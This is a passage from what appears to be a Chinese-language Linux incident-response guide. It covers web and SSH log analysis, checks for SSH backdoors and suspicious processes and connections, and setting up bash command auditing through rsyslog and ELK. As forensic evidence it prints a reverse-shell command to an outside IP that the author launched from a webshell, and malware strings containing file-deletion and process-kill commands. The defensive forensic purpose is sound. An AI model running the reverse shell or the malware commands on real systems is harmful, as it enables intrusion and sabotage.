重点关注POST请求
    grep 'POST' /var/log/httpd/access_log | awk '{print $1}' | sort | uniq -c | sort -nr
**3）Content-Length**
Content-Length过大的请求，例如过滤Content-Length大于5M的日志
**awk '{if($10 >5000000){print $0}}' /var/log/httpd/access_log**
注意
这里如果发现文件， **不要直接用vim查看编辑文件内容，这样会更改文件的mtime**
，而对于应急响应来说，时间点很重要。对比时间点更容易在Log找到其他的攻击痕迹。
**0x02 SSH服务**
**查看登录信息**
**登录成功：**
    grep 'Accepted' /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr
或者last命令，它会读取位于/var/log/wtmp的文件，并把该文件记录的登录系统的用户名单，全部显示出来。
**登录失败：**
    grep 'Failed' /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr
或者lastb命令，会读取位于/var/log/btmp的文件，并把该文件记录的登入系统失败的用户名单，全部显示出来。
**检查SSH后门**
1）比对ssh的版本
    > ssh -V
2）查看ssh配置文件和/usr/sbin/sshd的时间
    > stat /usr/sbin/sshd
3）strings检查/usr/sbin/sshd，看是否有邮箱信息
strings可以查看二进制文件中的字符串，在应急响应中是十分有用的。有些sshd后门会通过邮件发送登录信息，通过strings
/usr/sbin/sshd可以查看到邮箱信息。
4）通过strace监控sshd进程读写文件的操作
一般的sshd后门都会将账户密码记录到文件，可以通过strace进程跟踪到ssh登录密码文件。
    ps axu | grep sshd | grep -v grep
    root 65530 0.0 0.1 48428 1260 ? Ss 13:43 0:00 /usr/sbin/sshd
    strace -o aa -ff -p 65530
    grep open aa* | grep -v -e No -e null -e denied| grep WR
    aa.102586:open("/tmp/ilog", O_WRONLY|O_CREAT|O_APPEND, 0666) = 4
**0x03 进程**
检查是否存在可疑进程，需要注意如果攻击者获取到了Root权限，被植入内核或者系统层Rootkit的话，进程也会隐藏。
**1）资源占用**
Top然后找到CPU和MEM排序
**2）启动时间**
可疑与前面找到的Webshell时间点比对。
**3）启动权限**
这点很重要，比如某次应急中发现木马进程都是mysql权限执行的，如下所示：
    mysql 63763 45.3 0.0 12284 9616 ? R 01:18 470:54 ./db_temp/dazui.4
    mysql 63765 0.0 0.0 12284 9616 ? S 01:18 0:01 ./db_temp/dazui.4
    mysql 63766 0.0 0.0 12284 9616 ? S 01:18 0:37 ./db_temp/dazui.4
    mysql 64100 45.2 0.0 12284 9616 ? R 01:20 469:07 ./db_temp/dazui.4
    mysql 64101 0.0 0.0 12284 9616 ? S 01:20 0:01 ./db_temp/dazui.4
那基本可以判断是通过Mysql入侵，重点排查Mysql弱口令、UDF提权等。
**4）父进程**
例如我在菜刀中反弹Bash
    [root@server120 html]# ps -ef | grep '/dev/tcp' | grep -v grep
    apache 26641 1014 0 14:59 ? 00:00:00 sh -c /bin/sh -c "cd /root/apache-tomcat-6.0.32/webapps/ROOT/;bash -i >& /dev/tcp/192.168.192.144/2345 0>&1;echo [S];pwd;echo [E]" 2>&1
父进程进程号1014
    [root@server120 html]# ps -ef | grep 1014
    apache 1014 1011 0 Sep19 ? 00:00:00 /usr/sbin/httpd
可以看到父进程为apache，就可以判断攻击者通过Web入侵。
获取到可疑进程号之后，可疑使用 **lsof -p pid** 查看相关文件和路径。
例如之前遇到的十字病毒，会修改ps和netstat显示的进程名称
    udp 0 0 0.0.0.0:49937 0.0.0.0:* 131683/ls -la 
    udp 0 0 0.0.0.0:47584 0.0.0.0:* 116515/ifconfig
使用lsof -p pid可以看到可执行文件
    [root@DataNode105 admin]# lsof -p 131683
    COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME
    hahidjqzx 131683 root cwd DIR 8,98 4096 18087937 /root
    hahidjqzx 131683 root rtd DIR 8,98 4096 2 /
    hahidjqzx 131683 root txt REG 8,98 625622 24123895 /usr/bin/hahidjqzxs
可以文件类型可以使用file获取；
    [root@server120 tmp]# file .zl
    zl: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.9, not stripped
对于二进制的文件可以使用strings读取可读字符
    [root@server120 tmp]# strings .zl
    rm -f /boot/IptabLes ; rm -f /boot/.IptabLes ; rm -f /boot/IptabLex ; rm -f /boot/.IptabLex ; rm -f /usr
    /IptabLes ; rm -f /usr/.IptabLes ; rm -f /usr/IptabLex ; rm -f /usr/.IptabLex
    netstat -anp | grep "IptabLes" |awk '{print $NF}' |cut -d "/" -f 1 | xargs kill -9 > /dev/null ;free -m 
    > /dev/null
    netstat -anp | grep "IptabLex" |awk '{print $NF}' |cut -d "/" -f 1 | xargs kill -9 > /dev/null ;free -m 
    > /dev/null
例如之前应急遇到的命令替换，通过Strings查看发现有大量的IP地址。
    [root@i-9kp9tipm log]# strings /usr/bin/.sshd | egrep '[1-9]{1,3}.[1-9]{1,3}.'
    8.8.8.8
    8.8.4.4
    8.8.8.8
    61.132.163.68
    202.102.192.68
    202.102.213.68
    58.242.2.2
    202.38.64.1
    211.91.88.129
    211.138.180.2
    218.104.78.2
    202.102.199.68
    202.175.3.3
**0x04 网络连接**
需要注意如果攻击者获取到了Root权限，被植入内核或者系统层Rootkit的话，连接是可以被隐藏的。
    netstat -antlp | grep ESTABLISHED
查看已经建立的网络连接，例如反弹bash
    [root@server120 html]# netstat -antlp | grep EST | grep bash
    tcp 0 0 192.168.192.120:41320 192.168.192.144:2345 ESTABLISHED 26643/bash
    netstat -antlp | grep LISTEN
检查可以监听端口，例如攻击者在本地开启sock5代理，然后使用SSH反弹sock5。
    [root@server120 html]# netstat -antlp | grep LISTEN | grep 1080
    tcp 0 0 0.0.0.0:1080 0.0.0.0:* LISTEN 26810/python
    lsof -i:{port}
**0x05 敏感目录**
/tmp, /var/tmp, /dev/shm，所有用户都可读，可写，可执行
    [root@server120 ~]# ls -ald /tmp/
    drwxrwxrwt. 10 root root 4096 9月 20 09:41 /tmp/
    [root@server120 ~]# ls -ald /var/tmp/
    drwxrwxrwt. 2 root root 4096 9月 18 16:57 /var/tmp/
    [root@server120 ~]# ls -ald /dev/shm
    drwxrwxrwt. 3 root root 60 9月 1 10:23 /dev/shm
**0x06 history**
默认的history仅记录执行的命令，然而这些对于应急来说是不够的，很多系统加固脚本会添加记录命令执行的时间，修改记录的最大条数。之前写的关于Bash审计方式也很推荐。从Bash4.1
版本开始，Bash开始支持Rsyslog，
下载bash-4.4，下载地址： 
现在本机编译一份
**1）修改bashhist.c：**
修改771行
    syslog (SYSLOG_FACILITY|SYSLOG_LEVEL, "PID=%d UID=%d User=%s Cmd=%s", getpid(), current_user.uid, current_user.user_name, line);
修改776行
    syslog (SYSLOG_FACILITY|SYSLOG_LEVEL, "PID=%d UID=%d User=%s Cmd=%s", getpid(), current_user.uid, current_user.user_name, trunc);
**2）再修改config-top.h**
去掉115行/**/
syslog的FACILITY为 user，日志级别为info
**3）**
    ./configure --prefix=/usr/local/bash && make && make install
将 **/usr/local/bash/bin/bash** 拷贝出来
备份线上服务器原/bin/bash
    [root@localhost ~]# mv /bin/bash /bin/bashbak
RZ放到线上服务器
修改权限为755
4）修改rsyslog配置，这里我们先输出到本地测试一下
    [root@zaojiasys_31 admin]# touch /var/log/bash.log
    [root@zaojiasys_31 admin]# vim /etc/rsyslog.conf
添加user.info /var/log/bash.log
    [root@zaojiasys_31 admin]# service rsyslog restart
    [root@zaojiasys_31 admin]# tail -f /var/log/bash.log 
    Jul 25 16:22:15 localhost bash[18540]: PID=18540 UID=0 User=root Cmd=tail -f /var/log/bash.log 
    Jul 25 16:22:21 localhost bash[19033]: PID=19033 UID=0 User=root Cmd=whoami
    5）
    [root@zaojiasys_31 admin]# vim /etc/rsyslog.conf
修改*.info;mail.none;authpriv.none;cron.none;local6.none;user.none
/var/log/messages 添加user.none
添加user.info @10.110.1.33:3514
使用ELK，首先配置logstash
    input {
        syslog{  
            port => "3514"  
            type => "bash"
        }  
    }
    filter {
        grok{
            match => {
                "message" => "PID=%{NUMBER:processid} UID=%{NUMBER:uid} User=%{WORD:user} Cmd=%{GREEDYDATA:cmd}"
            }
        }
        date {
            match => ["timestamp", "MMM dd HH:mm:ss"]
            target => "@timestamp"
            "locale" => "en"
            timezone => "UTC"
        } 
        mutate {
            remove_field => [ "message" ]
        }
    }
    output {
       if "_grokparsefailure" not in [tags] {
            elasticsearch {
                hosts => "10.110.1.33:9200"
                index => "bash_%{+YYYY.MM.dd}"
            }
        }
    }
Elasticsearch 添加模板
    curl -XPUT 10.59.0.248:9200/_template/template_bash -d '
    {
       "template": "bash_*", 
       "order" : 10,
       "settings" : {
          "number_of_shards": 5,